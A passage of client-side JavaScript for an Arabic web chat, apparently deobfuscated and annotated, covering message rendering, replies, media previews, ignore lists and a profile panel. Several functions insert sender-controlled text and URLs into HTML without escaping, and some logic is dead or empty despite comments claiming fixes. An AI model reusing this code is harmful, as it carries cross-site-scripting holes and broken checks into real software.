    // بناء كائن رتبة افتراضي فارغ ومطابق لأنواع الخصائص (أرقام، نصوص، بوليان) في حال عدم العثور عليها
    var defaultPowerObj = JSON.parse(JSON.stringify(activeAlerts[0] || {}));
    var objectProperties = Object.keys(defaultPowerObj);
    for (var i = 0; i < objectProperties.length; i++) {
        switch (true) {
            case typeof defaultPowerObj[objectProperties[i]] == "number":
                defaultPowerObj[objectProperties[i]] = 0;
                break;
            case typeof defaultPowerObj[objectProperties[i]] == "string":
                defaultPowerObj[objectProperties[i]] = '';
                break;
            case typeof defaultPowerObj[objectProperties[i]] == "boolean":
                defaultPowerObj[objectProperties[i]] = false;
                break;
        }
    }
    return defaultPowerObj;
}


// دالة جلب مسار الصورة للأيقونة الخاصة (sico) أو الهدايا والدروع التفاعلية (dro3) الخاصة بالعضو
function getUserIconPath(userObj, explicitIcon) {
    if (isNoIconActive) {
        return ''; // عدم إرجاع أي أيقونة إذا كان الشات مغلق الأيقونات
    }
    // إذا كان العضو يملك أيقونة خاصة مضافة يدوياً من الكنترول b
    if (userObj.b != null && userObj.b != '') {
        return "sico/" + userObj.b;
    }
    var finalIconPath = '';
    // جلب الأيقونة الافتراضية المرتبطة بنوع رتبته الحالية
    finalIconPath = explicitIcon || (parseUserPowerString(userObj.power) || {
        'ico': ''
    }).ico || '';
    if (finalIconPath != '') {
        finalIconPath = "sico/" + finalIconPath;
    }
    // إذا لم يكن للرتبة أيقونة وكان يملك هدية أو درع تفاعلي
    if (finalIconPath == '' && (userObj.ico || '') != '') {
        finalIconPath = "dro3/" + userObj.ico.replace("dro3/", '');
    }
    return finalIconPath.replace("dro3/sico", "sico/");
}

var cachedUserHtmlTemplate = '*';
var cachedRoomHtmlTemplate = '*';

// دالة طلب الانضمام ودخول غرفة شات معينة، وتنبيه المستخدم بطلب كلمة المرور للغرف المقفلة سرّاً
function rjoin(roomIdParam) {
    var roomPasswordInput = '';
    if (rcach[roomIdParam].needpass) {
        roomPasswordInput = prompt("كلمه المرور؟", '');
        if (roomPasswordInput == '') {
            return; // إلغاء الدخول إذا ترك حقل كلمة المرور فارغاً
        }
    }
    // إرسال طلب انضمام للروم عبر أمر السيرفر rjoin
    send("rjoin", {
        'id': roomIdParam,
        'pwd': roomPasswordInput
    });
}

var cachedMessageHtmlTemplate = '*';

// معالج تحويل الاختصارات النصية للفيسات (مثل تحويل 'ف1') إلى وسوم صور إيموجيات حقيقية بالرسائل
function sanitizeIncomingText(messageTextContent) {
    if (messageTextContent.indexOf('ف') == -1) {
        return messageTextContent; // إرجاع النص كما هو إذا لم يحتوي على حرف الفاء الخاص بالفيسات
    }
    var emojiCountTracker = 0;
    var textWordsArray = messageTextContent.replace("\n", '').split(" ");
    var totalWordsCount = textWordsArray.length;

    // فحص الكلمات واستبدال الرموز (بشرط ألا يتجاوز إدخال الفيسات 8 إيموجيات في الرسالة الواحدة منعاً للسبام)
    for (var i = 0; i < totalWordsCount && emojiCountTracker < 0x8; i++) {
        if (textWordsArray[i][0] == 'ف' && selectedEmojiObject[textWordsArray[i]] != null) {
            emojiCountTracker++;
            messageTextContent = messageTextContent.replace(textWordsArray[i], "<img src=\"emo/" + selectedEmojiObject[textWordsArray[i]] + "\" class=\"emoi\">");
        }
    }
    return messageTextContent;
}

// دالة التحديث اللحظي لعداد الوقت غير المباشر للرسائل والمنشورات (Tago Timer)
function runTimeAgoUpdater() {
    $.each($(".tago"), function (index, tagoElement) {
        tagoElement = $(tagoElement);
        tagoElement[0].innerText = calculateTimeAgoString(parseInt(tagoElement.attr('ago') || 0));
    });
}

// صياغة فترات الوقت والانتظار بصيغة الشات المختصرة (د، س، ي، ش)
function calculateTimeAgoString(targetTimestamp) {
    var timeDifference = new Date().getTime() - targetTimestamp;
    var totalSeconds = Math.abs(timeDifference) / 1000;
    if (totalSeconds < 59) {
        return "الآن";
    }
    totalSeconds = totalSeconds / 60;
    if (totalSeconds < 59) {
        return parseInt(totalSeconds) + 'د'; // دقائق
    }
    totalSeconds = totalSeconds / 60;
    if (totalSeconds < 24) {
        return parseInt(totalSeconds) + 'س'; // ساعات
    }
    totalSeconds = totalSeconds / 24;
    if (totalSeconds < 30) {
        return parseInt(totalSeconds) + 'ي'; // أيام
    }
    totalSeconds = totalSeconds / 30;
    return parseInt(totalSeconds) + 'ش'; // شهور
}

// دالة فحص وتصفية نصوص الروابط لاستخراج روابط اليوتيوب (YouTube Regex Filter)
function extractYouTubeVideoId(textString) {
    var youtubeRegexPattern = /(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/;
    return textString.match(youtubeRegexPattern) ? [RegExp.$1.split('<').join("&#x3C;").split("'").join('').split("\"").join('').split('&').join(''), RegExp.lastMatch] : [];
}

// دالة حقن مشغل فيديو اليوتيوب Iframe تلقائياً في شاشة محادثة العضو عند إرسال رابط فيديو
function ytube(videoUrl, anchorElement) {
    $("<iframe width=\"95%\" style=\"max-width:240px;\" height=\"200\" src=\"" + videoUrl + "\" frameborder=\"0\" allowfullscreen></iframe>").insertAfter($(anchorElement));
    $(anchorElement).remove(); // إزالة نص الرابط الأصلي بعد التبديل بالمشغل
}

// نظام فتح لوحة الردود التفاعلية المتقدمة (Reply Modal Builder) عند الضغط على أزرار الرد .breply للرسائل أو منشورات الحائط
function reply(messageSelectorId, originalInputBoxClass) {
    var replyModalWindow = $("#rpl"); // المعرف المستخرج من فحص الواجهة لصندوق الردود
    var messageCloneNode = $($(messageSelectorId)[0].outerHTML);

    replyModalWindow.find(".modal-body .rmsg").html(messageCloneNode);
    var targetReplyArea = messageCloneNode.find(".reply:eq(0)");
    targetReplyArea.remove();
    messageCloneNode.find(".breply,.blike").remove(); // تنظيف أزرار الرد واللايك القديمة من النسخة المنسوخة

    replyModalWindow.find('.r').empty().append(targetReplyArea.css({
        'max-height': '',
        'height': "100%"
    }));
    replyModalWindow.find(".uzr .u-pic").first().css("background-position-y", "top");

    // تشغيل وفتح صندوق إيموجيات الخاص بالردود التفاعلية بصياغة موضعية مناسبة
    replyModalWindow.find(".emobox").off().click(function () {
        $(this).blur();
        var boxOffset = $(this).offset();
        var popupDialogInstance = openPopupDialog(this, cachedEmojiBoxElement, false);
        popupDialogInstance.css({
            'left': '',
            'top': Math.max(0, boxOffset.top - $(popupDialogInstance).height())
        });
    });

    // برمجة كليك زر الإرسال التابع للردود التفاعلية وحقنه في تبويب الحائط أو العام حسب نوع الإدخال الأصلي
    replyModalWindow.find(".sndpm").off().click(function (event) {
        event.preventDefault();
        if (originalInputBoxClass == ".tboxbc") {
            replyId = messageSelectorId;
            sendbc(false, null, replyModalWindow.find(".tbox")); // توجيه الرد لصندوق الحائط والبرودكاست
        }
        if (originalInputBoxClass == "#tbox") {
            replyId = messageSelectorId;
            Tsend(replyModalWindow.find(".tbox")); // توجيه الرد لصندوق الرسائل العامة العادية
        }
    });

    // برمجة حدث النقر على Enter في كيبورد صندوق الردود لإرسال النص فوراً
    replyModalWindow.find(".tbox").val('').off().keyup(function (keyEvent) {
        if (keyEvent.keyCode == 0xd) {
            keyEvent.preventDefault();
            if (originalInputBoxClass == ".tboxbc") {
                replyId = messageSelectorId;
                sendbc(false, null, replyModalWindow.find(".tbox"));
            }
            if (originalInputBoxClass == "#tbox") {
                replyId = messageSelectorId;
                Tsend(replyModalWindow.find(".tbox"));
            }
        }
    });

    replyModalWindow.modal(); // عرض نافذة الردود للمستخدم
    replyModalWindow.find(".r .reply").scrollTop(replyModalWindow.find(".r .reply")[0].scrollHeight); // تمرير الردود لأسفل تلقائياً
}
// تم الفحص الى هنا 4
// دالة بناء وحقن الرسائل ومنشورات الحائط والبرودكاست في الواجهة (Chat Items UI Injector)
function injectBroadcastItemToUi(targetContainerSelector, messagePayload) {
    var chatItemNode = $(cachedMessageHtmlTemplate); // قالب الرسالة الافتراضي umsg المفتوح سابقاً
    var senderUserObj = allUsersList[messagePayload.uid]; // جلب جهار مرسل الرسالة من الذاكرة

    // احتساب الوقت الدقيق لوصول الرسالة لضبط تايمر الـ Tago (الوقت الفائت)
    var timeOffsetDiff = new Date().getTime() - messagePayload.t;
    if (timeOffsetDiff < 0) {
        messagePayload.t += timeOffsetDiff;
    }

    // تفعيل كليك البروفايل عند الضغط على صورة البروفايل u-pic التابعة للرسالة
    chatItemNode.find(".u-pic").css("background-image", "url(\"" + messagePayload.pic + "\")").attr("onclick", "upro('" + messagePayload.uid + "');");
    chatItemNode.find(".tago").attr('ago', messagePayload.t).text(calculateTimeAgoString(messagePayload.t));
    chatItemNode.find(".u-topic").html(messagePayload.topic).css("color", messagePayload.ucol);

    // فحص واستبدال رموز الفيسات عبر دالة الاختصارات النصية sanitizeIncomingText
    messagePayload.msg = sanitizeIncomingText(messagePayload.msg);

    // فحص تصفية روابط اليوتيوب: إذا كانت الرسالة ليست في العام (#d2) وبها رابط يوتيوب يتم استبدال الرابط بمشغل زر كليك يوتيوب
    var youtubeVideoMatch = extractYouTubeVideoId(messagePayload.msg.replace(/\n/g, ''));
    if (youtubeVideoMatch.length > 1 && targetContainerSelector != "#d2") {
        messagePayload.msg = messagePayload.msg.replace(youtubeVideoMatch[1], "<button onclick='ytube(\"https://www.youtube.com/embed/" + youtubeVideoMatch[0] + "\",this);' style='font-size:40px!important;width:100%;max-width:200px;' class='btn fa fa-youtube'><img style='width:80px;' alt='[YouTube]' onerror='$(this).parent().remove();' src='https://img.youtube.com/vi/" + youtubeVideoMatch[0] + "/0.jpg' ></button>");
    }

    chatItemNode.find(".u-msg").html(messagePayload.msg).css("color", messagePayload.mcol).append(chatItemNode.find(".d-flex.fr"));

    if (messagePayload["class"] != null) {
        chatItemNode.addClass(messagePayload["class"]); // حقن الكلاس المخصص (مثل pmsgc للإعلانات)
    }

    // إذا كان العضو المرسل متصلاً ومسجلاً حالياً بالشات، يتم جلب وتركيب أيقونته الحالية وزخرفته
    if (senderUserObj != null) {
        var userIconUrl = getUserIconPath(senderUserObj);
        if (userIconUrl != '') {
            chatItemNode.find(".u-ico").attr("src", userIconUrl);
        }
        chatItemNode.find(".u-topic").css({
            'color': senderUserObj.ucol,
            'background-color': senderUserObj.bg
        });
    } else {
        chatItemNode.find(".u-ico").remove();
        chatItemNode.find(".u-topic").css({
            'color': messagePayload.ucol || "#000",
            'background-color': messagePayload.bg || ''
        });
    }

    // حساب تدرج لون خلفية الرسالة بناءً على لون نك نيم العضو
    var calculatedShade = generateColorShade(messagePayload.ucol || "#000000", -0x1e);
    chatItemNode.css({
        'background-color': calculatedShade == '' || calculatedShade == "#000000" || false ? '' : calculatedShade + '06'
    });

    var isTargetWallContainer = targetContainerSelector == "#d2bc";
    chatItemNode.find(".bdel").hide(); // إخفاء زر الحذف الإداري بشكل افتراضي

    // 1. إدارة منشورات الحائط والبرودكاست (bid) وبرمجة زر الحذف والتفاعل لها
    if (messagePayload.bid != null) {
        chatItemNode.addClass("bid" + messagePayload.bid);
        // قفل أو إتاحة زر حذف المنشور إذا كنت تملك صلاحية delbc أو كنت أنت كاتب المنشور lid الأصلي
        if (userPermissionsConfig.delbc || messagePayload.lid == (allUsersList[myid] || {
                'lid': null
            }).lid) {
            chatItemNode.find(".bdel").attr("onclick", "send('delbc', {bid:'" + messagePayload.bid + "'});").show();
        }
    }

    // 2. إدارة رسائل العام والخاص العادية (mi) وبرمجة زر الحذف التابع لصلاحية dmsg
    if (messagePayload.mi != null) {
        chatItemNode.addClass('mi' + messagePayload.mi);
        if (userPermissionsConfig.dmsg) {
            chatItemNode.find(".bdel").attr("onclick", "send('dmsg', {mi:'" + messagePayload.mi + "',topic:$(this).parent().parent().parent().find('.u-topic').text()});").show();
        }
    }

    // 3. التحكم برؤية أزرار الإعجابات (اللايكات blike) والردود التفاعلية (breply) للحائط أو العام بناءً على لوحة إعدادات المالك _0x104f82
    if (messagePayload.bid != null) {
        if (chatInteractionsConfig.bclikes == false) {
            chatItemNode.find(".blike").remove();
        } else {
            chatItemNode.find(".blike").attr("onclick", "send('likebc', {bid:'" + messagePayload.bid + "'});").show().text(messagePayload.likes || '');
        }
        if (chatInteractionsConfig.bcreply == false) {
            chatItemNode.find(".breply").remove();
        } else {
            chatItemNode.find(".breply").attr("onclick", "reply('.bid" + messagePayload.bid + "',\".tboxbc\");").show();
        }
    } else {
        if (messagePayload.mi != null) {
            if (chatInteractionsConfig.mlikes == false) {
                chatItemNode.find(".blike").remove();
            } else {
                chatItemNode.find(".blike").attr("onclick", "send('likem','" + messagePayload.mi + "');").show();
            }
            if (chatInteractionsConfig.mreply == false) {
                chatItemNode.find(".breply,.reply").remove();
            } else {
                chatItemNode.find(".breply").attr("onclick", "reply('.mi" + messagePayload.mi + "',\"#tbox\");").show();
            }
        } else {
            chatItemNode.find(".blike,.breply").remove();
        }
    }

    if (messagePayload.bmi || messagePayload.rmi) {
        chatItemNode.find(".reply").remove();
    }

    var parentContainerNode = $(targetContainerSelector);

    // 4. محرك الفحص والتشغيل التلقائي للملفات المرفوعة (Media Upload Link Parser) داخل الرسائل والخاص
    $.each(chatItemNode.find("a.uplink"), function (idx, linkElement) {
        var fileUrlPath = $(linkElement).attr('href') || '';
        // التحقق من شرط السمعة واللايكات لعرض الميديا الكسولة (السمعة rep يجب أن تكون أعلى من 100)
        var isMediaViewAllowed = true && (senderUserObj == null || senderUserObj && senderUserObj.rep >= 100);
        var fileExtensionType = mime[fileUrlPath.split('.').pop().toLowerCase()] || '';

        // أولاً: معالجة وعرض الصور المرفوعة بطريقة التحميل الكسول lazy load
        if (fileExtensionType.match(/image/i)) {
            var urlSegments = fileUrlPath.split('/').pop().split('.');
            if (urlSegments.length == 3 && isMediaViewAllowed) {
                var imgPreviewNode = $("<a href='" + fileUrlPath.substring(0, fileUrlPath.lastIndexOf('.')) + "' target='_blank' style='display:block;width:174px;margin-bottom: -21px;'><img dsrc='" + fileUrlPath + "' style='width:150px;height:110px;' class='hand lazy fitimg'></a>");
                imgPreviewNode.insertAfter(linkElement);
                $(linkElement).remove();
            } else {
                // إذا كان المستخدم لا يملك رتبة أو لايكات سمعة كافية، يظهر له زر يدوي "عرض الصورة" بدلاً من العرض التلقائي لتقليل استهلاك الرام
                var viewImgBtnNode = $("<div style='width:100%;'><button class='btn fl fa fa-image' style='color:black;'>عرض الصوره</button></div>");
                viewImgBtnNode.insertAfter(linkElement);
                $(linkElement).remove();
                if (urlSegments.length == 3) {
                    fileUrlPath = fileUrlPath.substring(0, fileUrlPath.lastIndexOf('.'));
                }
                viewImgBtnNode.click(function () {
                    $("<a href='" + fileUrlPath + "' target='_blank'><img style='max-width:100%;max-height:160px;display:block;' src='" + fileUrlPath + "' class='hand fitimg'></a>").insertAfter(viewImgBtnNode);
                    viewImgBtnNode.remove();
                });
            }
        }

        // ثانياً: معالجة وعرض مقاطع الفيديو المرفوعة مع قفل قسري لمنع تداخل تشغيل أكثر من فيديو في نفس الوقت
        if (fileExtensionType.match(/video/i)) {
            var videoPreviewNode = $("<div style='width:100%;'><button class='btn' style='color:black;padding:0px 4px;margin-bottom:-21px;min-height:32px;'>▶ " + (isMediaViewAllowed ? "<img class='lazy' dsrc='" + fileUrlPath + ".jpg' style='width:122px;height:110px;'>" : "عرض الفيديو") + "</button></div>");
            videoPreviewNode.insertAfter(linkElement);
            $(linkElement).remove();
            videoPreviewNode.click(function () {
                $("<video onplay='if(playing!=null && playing!= this&&!playing.paused){playing.pause();};playing=this;' style='width:100%;max-height:160px;' controls autoplay><source src='" + fileUrlPath + "'></video>").insertAfter(videoPreviewNode);
                videoPreviewNode.remove();
            });
        }

        // ثالثاً: معالجة وعرض ملفات ومقاطع الصوت (Audio) المرفوعة
        if (fileExtensionType.match(/audio/i)) {
            var audioPreviewNode = $("<div style='width:100%;'><button class='btn fl fa fa-youtube-play' style='color:black;'>مقطع صوت</button></div>");
            audioPreviewNode.insertAfter(linkElement);
            $(linkElement).remove();
            audioPreviewNode.click(function () {
                $("<audio onplay='if(playing!=null&& playing!= this&&!playing.paused){playing.pause();};playing=this;' style='width:100%;' controls><source src='" + fileUrlPath + "' type='audio/mpeg'></audio>").insertAfter(audioPreviewNode);
                audioPreviewNode.remove();
            });
        }
    });

    // 5. آلية حقن الرد التفاعلي بداخل شجرة المحادثة التابعة لرسالته الأصلية rmi
    if (isTargetWallContainer == true) {
        // التخطي إذا كان الحاقن في حاوية منشورات الحائط
    } else {
        if (messagePayload.rmi != null) {
            chatItemNode.find(".breply").remove();
            var existingRepliesContainer = $(".d2 .mi" + messagePayload.rmi).find(".reply");

            // زيادة عداد أرقام الرد التفاعلي الظاهر على الزر بالواجهة +1 عند استقبال رد جديد
            if (existingRepliesContainer.length) {
                var replyCounterBtn = $(".mi" + messagePayload.rmi).find(".breply");
                replyCounterBtn.text((parseInt(replyCounterBtn.text()) || 0) + 1);
                existingRepliesContainer.append(chatItemNode);
            }

            // إذا كان صندوق الردود التفاعلية المخصص لرسالة معينة مفتوحاً أمام المستخدم، قم بإدراج الرد داخله فوراً مع عمل انيميشن التمرير لأسفل d2
            var activeReplyModalBox = $("#rpl .mi" + messagePayload.rmi);
            if (activeReplyModalBox.length) {
                existingRepliesContainer = $("#rpl .r .reply");
                existingRepliesContainer.append(chatItemNode[0].outerHTML);
                existingRepliesContainer.stop().animate({
                    'scrollTop': existingRepliesContainer[0].scrollHeight
                }, 100);
            }
        } else {
            // <-- [إصلاح] هنا تم حذف الأقواس العشوائية }}} التي قطعت الكود بشكل خاطئ
            chatItemNode.appendTo(parentContainerNode); // حقن الرسالة العادية في حاوية الشات المخصصة لها بالختام
        }
    }

    // تكمّلة دالة injectBroadcastItemToUi: معالجة طريقة التمرير وإضافة الرسائل بداخل حاوية الحائط d2bc
    if (isTargetWallContainer == true && true) {
        // حد أقصى 100 رسالة (100) في الواجهة؛ إذا تجاوزتها يتم حذف أقدم رسالة تلقائياً لتسريع المتصفح
        if (parentContainerNode[0].childNodes.length >= 100) {
            parentContainerNode[0].childNodes[parentContainerNode[0].childNodes.length - 1].remove();
        }

        // إذا كان التمرير في الأعلى أو كان كاتب البرودكاست هو أنت
        if (parentContainerNode[0].scrollTop == 0 || messagePayload.uid == myid) {
            if (messagePayload.bmi != null) {
                chatItemNode.find(".breply").remove();
                var replyAreaContainer = $(".d2 .bid" + messagePayload.bmi).find(".reply");
                if (replyAreaContainer.length) {
                    var replyCounterBtn = $(".bid" + messagePayload.bmi).find(".breply");
                    replyCounterBtn.text((parseInt(replyCounterBtn.text()) || 0) + 1);
                    replyAreaContainer.append(chatItemNode);
                }
                var activeReplyModalBox = $("#rpl .bid" + messagePayload.bmi);
                if (activeReplyModalBox.length) {
                    replyAreaContainer = $("#rpl .r .reply");
                    replyAreaContainer.append(chatItemNode[0].outerHTML);
                    replyAreaContainer.stop().animate({
                        'scrollTop': replyAreaContainer[0].scrollHeight
                    }, 100);
                }
            } else {
                // إضافة المنشور في البداية وعمل حركة انيميشن تمرير سريعة للأعلى
                parentContainerNode.prepend(chatItemNode);
                if (messagePayload.uid == myid) {
                    parentContainerNode.scrollTop(chatItemNode.innerHeight());
                    parentContainerNode.stop().animate({
                        'scrollTop': 0
                    }, 100);
                }
            }
        } else {
            // إذا استقبلت برودكاست جديد من عضو آخر وأنت تتصفح الحائط بالأسفل، يظهر لك زر "المزيد" #bcmore
            if (messagePayload.bmi != null) {
                chatItemNode.find(".breply").remove();
                var replyAreaContainer = $("#d2bc").find(".bid" + messagePayload.bmi).find(".reply");
                if (replyAreaContainer.length) {
                    var replyCounterBtn = $("#d2bc").find('.bid' + messagePayload.bmi).find(".breply");
                    replyCounterBtn.text((parseInt(replyCounterBtn.text()) || 0) + 1);
                    replyAreaContainer.append(chatItemNode);
                }
                var activeReplyModalBox = $("#rpl").find(".bid" + messagePayload.bmi);
                if (activeReplyModalBox.length) {
                    replyAreaContainer = $("#rpl").find(".r .reply");
                    replyAreaContainer.append(chatItemNode[0].outerHTML);
                    replyAreaContainer.stop().animate({
                        'scrollTop': replyAreaContainer[0].scrollHeight
                    }, 100);
                }
            } else {
                chatItemNode.prependTo(parentContainerNode);
                $("#bcmore").show(); // إظهار زر تنبيه بوجود منشورات جديدة بالأعلى
                isBroadcastScrollTop = true;
            }
        }
    } else {
        // معالجة طريقة التمرير وضخ الرسائل العامة العادية بداخل الغرفة #d2
        if (isTargetWallContainer && false) {
            if (parentContainerNode[0].childNodes.length >= 100) {
                parentContainerNode[0].childNodes[0].remove(); // حذف أقدم رسالة من العام
            }

            // التمرير التلقائي لأسفل العام فوراً إذا كان المستخدم يقف بالأسفل أو كانت الرسالة تخصه
            if (parentContainerNode[0].scrollHeight - parentContainerNode[0].clientHeight - parentContainerNode[0].scrollTop <= 1 || messagePayload.uid == myid) {
                if (messagePayload.bmi != null) {
                    chatItemNode.find(".breply").remove();
                    var replyAreaContainer = $(".d2 .bid" + messagePayload.bmi).find(".reply");
                    if (replyAreaContainer.length) {
                        var replyCounterBtn = $(".bid" + messagePayload.bmi).find(".breply");
                        replyCounterBtn.text((parseInt(replyCounterBtn.text()) || 0) + 1);
                        replyAreaContainer.append(chatItemNode);
                    }
                    var activeReplyModalBox = $("#rpl .bid" + messagePayload.bmi);
                    if (activeReplyModalBox.length) {
                        replyAreaContainer = $("#rpl .r .reply");
                        replyAreaContainer.append(chatItemNode[0].outerHTML);
                        replyAreaContainer.stop().animate({
                            'scrollTop': replyAreaContainer[0].scrollHeight
                        }, 100);
                    }
                } else {
                    parentContainerNode.append(chatItemNode);
                    parentContainerNode.stop().animate({
                        'scrollTop': parentContainerNode[0].scrollHeight - 1
                    }, 100);
                }
            } else {
                if (messagePayload.bmi != null) {
                    chatItemNode.find(".breply").remove();
                    var replyAreaContainer = $("#d2bc").find(".bid" + messagePayload.bmi).find(".reply");
                    if (replyAreaContainer.length) {
                        var replyCounterBtn = $("#d2bc").find(".bid" + messagePayload.bmi).find(".breply");
                        replyCounterBtn.text((parseInt(replyCounterBtn.text()) || 0) + 1);
                        replyAreaContainer.append(chatItemNode);
                    }
                    var activeReplyModalBox = $("#rpl").find(".bid" + messagePayload.bmi);
                    if (activeReplyModalBox.length) {
                        replyAreaContainer = $("#rpl").find(".r .reply");
                        replyAreaContainer.append(chatItemNode[0].outerHTML);
                        replyAreaContainer.stop().animate({
                            'scrollTop': replyAreaContainer[0].scrollHeight
                        }, 100);
                    }
                } else {
                    chatItemNode.appendTo(parentContainerNode);
                    parentContainerNode.stop().animate({
                        'scrollTop': parentContainerNode[0].scrollTop + parentContainerNode[0].scrollHeight / 4
                    }, 100);
                }
            }
        } else if (parentContainerNode.length) {
            // حصر عدد الرسائل في شاشة العام بـ 36 رسالة (36) منعاً لتعليق متصفحات الهواتف
            if (parentContainerNode[0].childNodes.length >= 36) {
                parentContainerNode[0].childNodes[0].remove();
            }
            parentContainerNode.stop().animate({
                'scrollTop': parentContainerNode[0].scrollHeight
            }, 100);
        }
    }
    
    return chatItemNode; // <-- [إصلاح] تم ترتيب أسلوب الإرجاع لإنهاء الدالة البرمجية بشكل كامل وصحيح ومغلق
}


        // دالة إرسال الهدايا والدروع التفاعلية للأعضاء بالأمر gift (Gifts Sender)
        function gift(targetUserId, giftFileName) {
            send("action", {
                'cmd': 'gift',
                'id': targetUserId,
                'gift': giftFileName
            });
        }

        // دالة إرسال وتركيب بنر الترحيب للعضو أو إزالته عبر الكنترول (Welcome Banner Manager)
        function ubnr(targetUserId, bannerFileName) {
            if (bannerFileName == null) {
                return;
            }
            if (bannerFileName == '') {
                send('bnr-', {
                    'u2': targetUserId
                }); // أمر إزالة البنر bnr-
            } else {
                send('bnr', {
                    'u2': targetUserId,
                    'bnr': bannerFileName
                }); // أمر إضافة البنر bnr
            }
        }

        // دالة إعادة توجيه الصفحة للرئيسية عند الفصل التام والقطع قسرياً (Disconnection Redirector)
        function closex(delayTime) {
            if (isRoomLocked) {
                return;
            }
            window.onbeforeunload = null;
            isRoomLocked = true;
            if (chatPermissionsCookie) {
                window.close(); // إغلاق لوحة التحكم تلقائياً
                return;
            }
            setTimeout("location.href=\"/\";", delayTime || 3000); // تحويل للرئيسية بعد 3 ثوانٍ
        }

        // دالة جلب قائمة التجاهل الشخصية (Blocklist/Ignore List) المخزنة في الـ LocalStorage عند فتح الشات
        function loadIgnoreBlocklist() {
            var storedBlocklist = getv("blocklist");
            if (storedBlocklist != null && storedBlocklist != '') {
                try {
                    storedBlocklist = JSON.parse(storedBlocklist);
                    if (Array.isArray(storedBlocklist)) {
                        activeBansList = storedBlocklist;
                    }
                } catch (e) {}
            }
        }

        // دالة تخزين وتحديث قائمة التجاهل الشخصية في الـ LocalStorage للكمبيوتر أو الموبايل
        function saveIgnoreBlocklist() {
            var serializedBlocklist = JSON.stringify(activeBansList);
            setv("blocklist", serializedBlocklist);
        }

        // دالة إلغاء التجاهل والـ Unignore عن عضو معين وإعادة بناء حالته بالواجهة
        function removeUserFromIgnore(userObj) {
            for (var i = 0; i < activeBansList.length; i++) {
                var blockedItem = activeBansList[i];
                if (blockedItem.lid == userObj.lid) {
                    activeBansList.splice(i, 1); // حذفه من مصفوفة التجاهل
                    updateUserRowInUi(userObj.id); // إعادة رسم وتحديث حالته بالمتواجدين لإزالة شارة الكتم
                }
            }
            saveIgnoreBlocklist();
        }

        // دالة تفعيل التجاهل والـ Ignore التام لكتم رسائل العضو المستهدف بالخاص والعام
        function addUserToIgnore(userObj) {
            if (userObj.id == myid) {
                return; // منع تجاهل نفسك
            }
            // فحص ما إذا كان العضو متواجداً مسبقاً بقائمة تجاهلك
            for (var i = 0; i < activeBansList.length; i++) {
                var blockedItem = activeBansList[i];
                if (blockedItem.lid == userObj.lid) {
                    return;
                }
            }
            // حقن معرّف حسابه الفريد lid بداخل قائمة الحظر الشخصية
            activeBansList.push({
                'lid': userObj.lid
            });
            updateUserRowInUi(userObj.id); // تحديث حالته بالواجهة لإظهار شارة الكتم أو الحظر fa-ban
            saveIgnoreBlocklist();
        }
        // دالة التحقق مما إذا كان العضو متواجداً داخل قائمة التجاهل الشخصية الخاصة بك (Ignore Validator)
        function isUserIgnoredInList(userObj) {
            for (var i = 0; i < activeBansList.length; i++) {
                var blockedItem = activeBansList[i];
                if (blockedItem.lid == userObj.lid) {
                    return true; // العضو متجاهل بالفعل
                }
            }
            return false;
        }

        var lastUserProfileClickTimeCache = {};

        // المحرك الرئيسي لفتح وعرض الملف الشخصي للأعضاء ولوحة التحكم بالعقوبات والرتب (User Profile Drawer/Modal)
        function upro(targetUserId) {
            var isRoomOwnerPermission = userPermissionsConfig.roomowner;
            var targetUserObj = allUsersList[targetUserId];
            if (targetUserObj == null) {
                return;
            }

            // حماية السيرفر من السبام: منع النقر المتكرر لفتح الملف الشخصي في أقل من 5 دقائق (300,000 ملي ثانية)
            if (targetUserId != myid) {
                if (lastUserProfileClickTimeCache[targetUserId] != null) {
                    if (new Date().getTime() - lastUserProfileClickTimeCache[targetUserId] > 300000) {
                        delete lastUserProfileClickTimeCache[targetUserId];
                    }
                }
                if (lastUserProfileClickTimeCache[targetUserId] == null) {}
            }

            // منع فتح الملف الشخصي للأعضاء المتخفين إذا كانت رتبتهم أعلى من رتبتك الحالية لحماية الإدارة
            if (targetUserObj.s && parseUserPowerString(targetUserObj.power).rank > userPermissionsConfig.rank) {
                return;
            }

            var profileModalWindow = $("#upro"); // المعرف المستخرج من فحصك لكلاس الملف الشخصي upro

            // تنظيف ومعالجة امتداد ورابط الصورة الشخصية وتنسيقها لتناسب مربع العرض الفعلي
            var picUrlSegments = targetUserObj.pic.split('.');
            if (targetUserObj.pic.split('/').pop().split('.').length > 2) {
                picUrlSegments.splice(picUrlSegments.length - 1, 1);
            }

            profileModalWindow.find(".u-pic").css("background-image", "url(\"" + picUrlSegments.join('.') + "\")").removeClass("fitimg").addClass("fitimg");
            profileModalWindow.find(".u-msg").html(targetUserObj.msg); // عرض الحالة الشخصية للعضو u-msg

            // معالجة جلب اسم وصورة علم الدولة (Flags) المربوطة بحسابه من مصفوفة uf الكلية للأعضاء
            if (uf[(targetUserObj.co || '').toLocaleLowerCase()] != null) {
                profileModalWindow.find(".u-co").text(uf[targetUserObj.co.toLocaleLowerCase()]).append("<img style=\"width:24px;height:24px;border-radius:1px;margin-top: -3px;\" class=\"fl\" src=\"flags/" + targetUserObj.co + ".png\">");
            } else {
                profileModalWindow.find(".u-co").text('--');
            }

            var iconPath = getUserIconPath(targetUserObj);
            var currentRoomName = "بدون غرفه";
            var currentRoomObj = rcach[targetUserObj.roomid];

            // 1. إدارة ميزة تغيير النك نيم والزخرفة قسرياً (صلاحية unick للمشرفين أو mynick لنفسك)
            if (userPermissionsConfig.unick == true || userPermissionsConfig.mynick == true && targetUserId == myid) {
                $(".u-topic").val(targetUserObj.topic);
                profileModalWindow.find(".nickbox").show(); // إظهار صندوق التعديل nickbox
                profileModalWindow.find(".u-nickc").off().click(function () {
                    // إرسال طلب تغيير النك نيم للسيرفر عبر أمر السيرفر unick
                    send("unick", {
                        'id': targetUserId,
                        'nick': profileModalWindow.find(".u-topic").val()
                    });
                });
            } else {
                profileModalWindow.find(".nickbox").hide();
            }

            // 2. إدارة ميزة إرسال دعوة للانتقال لغرفة أخرى (صلاحية rinvite للمشرفين)
            if (userPermissionsConfig.rinvite) {
                profileModalWindow.find(".roomzbox").show();
                profileModalWindow.find(".rpwd").val(''); // تصفير حقل كلمة مرور الغرفة
                var roomDropdownMenu = profileModalWindow.find(".roomz");
                roomDropdownMenu.empty();

                // بناء وتعبئة قائمة الغرف المتاحة للدعوة مع فرز عدد زوار كل غرفة [uco]
                for (var i = 0; i < chatRoomsList.length; i++) {
